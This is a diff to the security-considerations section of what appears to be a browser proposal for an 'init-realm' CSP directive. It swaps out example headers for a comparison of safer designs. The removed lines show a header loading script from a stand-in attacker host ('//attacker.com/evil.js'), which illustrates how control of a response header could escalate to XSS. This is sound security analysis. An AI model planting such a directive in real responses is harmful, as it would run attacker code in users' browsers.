@@ -350,23 +350,22 @@ Therefore it's important for implementations to get that part right, and for tes
 
 #### Escalation to Code Execution
 
-From the perspective of an attacker, this proposal can also be thought of as a way to escalate a CSP directive set to full code execution, because of the attacker doesn't find a way to introduce an XSS to the web app, but can somehow control parts of the response's headers, they can translate such capability to an effective XSS using this proposal, by simply configuring a CSP header with the proposed `init-realm` directive pointing to a remote script they control:
+From the perspective of an attacker, this proposal can also be thought of as a way to escalate a CSP directive set power to full code execution, because if the attacker doesn't find a way to introduce an XSS to the web app, but can somehow control parts of the response's headers, they can translate such capability to an effective XSS using this proposal, by simply configuring a CSP header with the proposed `init-realm` directive pointing to a remote script they control.
 
-```html
-<!-- Content-Security-Policy: init-realm: //attacker.com/evil.js -->
+In this proposal's current form, this in fact is more than just a security consideration, but perhaps an introduction of an unprecedented security concern, where being able to modify headers can result in XSS (which is possible today only via chaining such ability with other security issues in a vulnerable web app).
 
-<html location="//example.com">
-</html>
-```
+In that context, it might be worth reflecting possible alternatives and their pros and cons:
 
-Therefore, it might be important to make sure the address to the remote script resource introduced in the proposed `init-realm` directive properly obeys to other parts of CSP that have the power to mitigate it so attackers won't be able to load them by remote resources the control (e.g. `//attacker.com/evil.js`) nor local ones (e.g. `blob:https://web.app/aa14dc0d-c44c-4072-b918-bff92d26b9b7`):
-
-```html
-<!-- Content-Security-Policy: script-src: 'self'; init-realm: //attacker.com/evil.js -->
-
-<html location="//example.com">
-</html>
-```
+1. CSP (via header) - introduce `init-realm` via a CSP header (current proposal's state)
+   * PRO - a capability preserved to the web app (which is the entity expected to be capable of controling such power)
+   * CON - if the web app mistakenly allows other entities to control headers, this feature can allow them to introduce XSS (unprecedented)
+2. CSP (via meta) - introduce `init-realm` via a meta tag
+   * PRO - Better than a header in the sense that transitioning from a headers' setting capability to XSS is unprecedented and quite an escalation, but if attackers need to be able to modify the initial HTML of the app to transition to XSS, that is (1) more unlikely and (2) less of an escalation (if they can inject HTML tags, they might as well inject a script or an iframe).
+   * CON - Even if mitigated, still potentially an escalation, for example if attacker can introduce HTML tags but is blocked from getting them to execute thanks to a strict `script-src` implementation, providing a meta tag with `init-realm` can help them escalate to XSS).
+3. API (via JavaScript) - instead of CSP, export a JavaScript API that registeres the script to run within all realms (e.g. `window.onRealmInit('/scripts/init-realm.js')`)
+   * PRO - This mitigates possibilities for escalations towards code execution, because in order to abuse this feature the attacker must have code execution abilities to begin with
+   * CON - Potentially allows all scripts in the page to register their own script (although probably not an issue for 1st party scripts, as long as order of registration is respected, but perhaps sensitive with 3rd party scripts?)
+   * NOTE - Perhaps in a similar manner to `navigator.serviceWorker.register`?
 
 #### Integrity of Execution Order
 
